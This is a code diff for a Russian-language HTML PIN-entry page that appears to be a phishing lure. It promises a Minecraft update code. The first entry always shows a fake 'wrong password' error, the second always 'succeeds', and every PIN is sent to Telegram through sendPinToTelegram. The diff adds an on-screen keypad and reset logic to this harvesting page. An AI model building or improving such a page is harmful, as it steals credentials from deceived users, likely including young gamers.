@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PIN Code</title>
+    <title>PIN Code Input</title>
     <style>
         body {
             display: flex;
@@ -54,6 +54,20 @@
             75% { transform: translateX(-5px); }
             100% { transform: translateX(0); }
         }
+        #keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .key {
+            background-color: #ccc;
+            border: none;
+            border-radius: 5px;
+            font-size: 20px;
+            padding: 15px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -68,10 +82,26 @@
         <p id="error-message">Неверный пароль. Пожалуйста, попробуйте еще раз.</p>
         <p id="success-message">Вот ваш код для обновления Minecraft -Id74838848</p>
     </div>
+    <div id="keyboard">
+        <!-- Клавиатура -->
+        <button class="key">1</button>
+        <button class="key">2</button>
+        <button class="key">3</button>
+        <button class="key">4</button>
+        <button class="key">5</button>
+        <button class="key">6</button>
+        <button class="key">7</button>
+        <button class="key">8</button>
+        <button class="key">9</button>
+        <button class="key">0</button>
+        <button class="key" id="backspace">⌫</button>
+        <button class="key" id="reset">Сброс</button>
+    </div>
 
     <script>
         let pin = [];
         let attemptCount = 0;
+        let success = false;
         const pinCircles = document.querySelectorAll('.pin-circle');
 
         function updatePinDisplay(error = false) {
@@ -97,19 +127,26 @@
             }, 500);
         }
 
-        document.addEventListener('keydown', (event) => {
-            if (event.key >= '0' && event.key <= '9' && pin.length < 4) {
-                pin.push(event.key);
-                updatePinDisplay();
-            } else if (event.key === 'Backspace' && pin.length > 0) {
-                pin.pop();
-                updatePinDisplay();
+        function handleKeyPress(value) {
+            if (success) {
+                resetPin();
+                return;
             }
+
+            if (value === '⌫') {
+                pin.pop();
+            } else if (pin.length < 4 && !isNaN(value)) {
+                pin.push(value);
+            } else if (value === 'Сброс') {
+                resetPin();
+            }
+
+            updatePinDisplay();
 
             if (pin.length === 4) {
                 validatePin(pin.join(''));
             }
-        });
+        }
 
         function validatePin(enteredPin) {
             attemptCount++;
@@ -127,7 +164,17 @@
                 // Второй ввод: всегда успешный
                 document.getElementById('success-message').style.display = 'block';
                 sendPinToTelegram(enteredPin);
+                success = true;
             }
+        }
+
+        function resetPin() {
+            pin = [];
+            updatePinDisplay();
+            document.getElementById('error-message').style.display = 'none';
+            document.getElementById('success-message').style.display = 'none';
+            success = false;
+            attemptCount = 0;
         }
 
         function sendPinToTelegram(pin) {
@@ -146,6 +193,12 @@
                 })
             });
         }
+
+        document.getElementById('keyboard').addEventListener('click', (event) => {
+            if (event.target.classList.contains('key')) {
+                handleKeyPress(event.target.innerText);
+            }
+        });
     </script>
 </body>
 </html>
